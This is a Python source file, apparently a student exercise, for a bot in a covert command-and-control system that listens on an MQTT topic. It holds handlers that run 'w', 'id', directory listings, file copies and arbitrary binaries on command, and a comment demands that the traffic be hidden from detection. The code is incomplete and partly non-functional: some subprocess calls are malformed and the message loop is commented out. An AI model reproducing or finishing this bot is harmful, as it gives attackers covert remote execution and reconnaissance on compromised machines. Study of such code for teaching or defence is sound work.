import paho.mqtt.client as mqtt
import base64
from globvars import DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC, CMD_TYPES, RESP_TYPES, ROOT_SECRET, SALT
import hmac
from datetime import datetime
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
from protocol import ProtocolHandler
import subprocess

class BotController:
    '''
        1) CLI
        2) Command intent
        3) Frame building / parsing
        4) Obfuscation / Encoding
        5) Publishing / Receiving 
    '''
    def __init__(self,
                 broker_address:str = DEFAULT_BROKER_ADDRESS,
                 port: int = DEFAULT_PORT,
                 topic: str = DEFAULT_TOPIC,
                 secret_key: str = ROOT_SECRET):
        self.broker_address = broker_address
        self.port = port
        self.topic = topic
        self.client = Client(broker_address, port, topic)
        self.secret = self._derive_session_key(secret_key)
        print("Bot Controller initialized.")
        print(f"Derived session key: {self.secret}")
    
    def start(self):
        self.client.connect()

    def _derive_session_key(self, root_secret):
        # Use Argon2id to derive a session key from the root secret and timestamp
        salt = hashes.Hash(hashes.SHA256())
        salt.update(SALT.encode())
        salt = salt.finalize()[:16]  # Use first 16 bytes of the hash as salt
        kdf = Argon2id(
            memory_cost=102400,
            length=32,
            salt=salt,
            iterations=2,
            lanes=8,
        )
        session_key = kdf.derive(root_secret.encode())
        return session_key

    # To a file for now
    def _publish_frame(self, frame: bytes) :
        with open("out_frame.bin", "wb") as f:
            f.write(frame)

    def command_to_type(self, args) -> tuple[int, bytes]:
        if args.announce:
            return CMD_TYPES["announce"], args.announce.encode()
        if args.list_users:
            return CMD_TYPES["list_users"], b""
        if args.list_dir:
            return CMD_TYPES["list_dir"], args.list_dir.encode()
        if args.user_id:
            return CMD_TYPES["user_id"], b""
        if args.copy_file:
            return CMD_TYPES["copy_file"], args.copy_file.encode()
        if args.exec_binary:
            return CMD_TYPES["exec_binary"], args.exec_binary.encode()
        if args.kill:
            return CMD_TYPES["kill"], b""

        raise ValueError("No valid command provided.")

    def handle_announce(self, payload: bytes):
        msg = payload.decode(errors="ignore")
        response = f"Bot alive at {datetime.now().isoformat()} | msg={msg}"
        return RESP_TYPES["ok"], response.encode()

    def handle_list_users(self, payload: bytes):
        # run w
        subp_command = subprocess.run("w", capture_output=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_list_dir(self, payload: bytes):
        path = payload.decode()
        command = f"ls {path}"

        subp_command = subprocess.run(command, capture_output=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_user_id(self, payload: bytes):
        # run id 
        subp_command = subprocess.run("id", capture_output=True)
        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_copy_files(self, payload: bytes):
        path = payload.decode()
        command = f"cp {path}"
        subp_command = subprocess.run(command, capture_output=True)

        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_exec_binary(self, payload: bytes):
        path = payload.decode()
        command = f"{path}"
        subp_command = subprocess.run(command, capture_output=True)

        if subp_command.returncode != 0:
            return RESP_TYPES["error"], subp_command.stderr
        return RESP_TYPES["ok"], subp_command.stdout

    def handle_kill(self, payload: bytes):
        exit()

    def handle_commands(self, cmd_type: int, payload: bytes) -> tuple[int, bytes]:
        handlers = {
            1: self.handle_announce,
            2: self.handle_list_users,
            3: self.handle_list_dir,
            4: self.handle_user_id,
            5: self.handle_copy_files,
            6: self.handle_exec_binary,
            255: self.handle_kill,
        }

        handler = handlers.get(cmd_type)
        if not handler:
            return RESP_TYPES["error"], b"Unknown command"
        
        return handler(payload)
class Client:
    def _on_connect(self, client, userdata, flags, reason_code, properties):
        print(f"Connected with result code {reason_code}")
        client.subscribe(self.topic)
    
    #     You must hide your communication and the controller should not be easily detected as 'bots' in the topic.
    # Filter those messages meant for the bot
    def _on_message(self, client, userdata, message):
        raw_payload = message.payload.decode()
        try:
            decoded = base64.b32decode(raw_payload).decode(errors="ignore")
            print(f"Message received on topic {message.topic}: {decoded}")
        except Exception as e:
            print(f"(!) Failed to decode message: {e}")
            print(f"Message received on topic {message.topic}: {raw_payload}")
    def connect(self):
        self.client.connect(self.broker_address, self.port)
        self.client.loop_forever()

    def __init__(self,
                 broker_address:str,
                 port: int,
                 topic: str):
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2) # taken from the docs 
        self.broker_address = broker_address
        self.port = port
        self.topic = topic
        self.client.on_connect = self._on_connect
        self.client.on_message = self._on_message


def main():
    bot_cont = BotController(
        broker_address=DEFAULT_BROKER_ADDRESS,
        port=DEFAULT_PORT,
        topic=DEFAULT_TOPIC,
        secret_key=ROOT_SECRET
    )
    bot_cont.start()

    # message = ""
    # with open("out_frame.bin", "rb") as f:
    #     message = f.read()
    # print("Loaded message from out_frame.bin")
    # protocol_handler = ProtocolHandler(secret=bot_cont.secret)
    # decoded_m = protocol_handler.decode_frame(message)
    # print(protocol_handler.verify_frame(decoded_m))

    # # unpack the message
    # magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
    # print(f"Cmd: {cmd_type};\nPayload: {payload}")

    # # Handle commands
    # response, payload = bot_cont.handle_commands(cmd_type=cmd_type, payload=payload)

    # # encode and send frame to the controller
    # frame = protocol_handler.build_frame(response, payload=payload)
    # encoded_frame = protocol_handler.encode_frame(frame)

    # bot_cont._publish_frame(encoded_frame)

if __name__ == "__main__":
    main()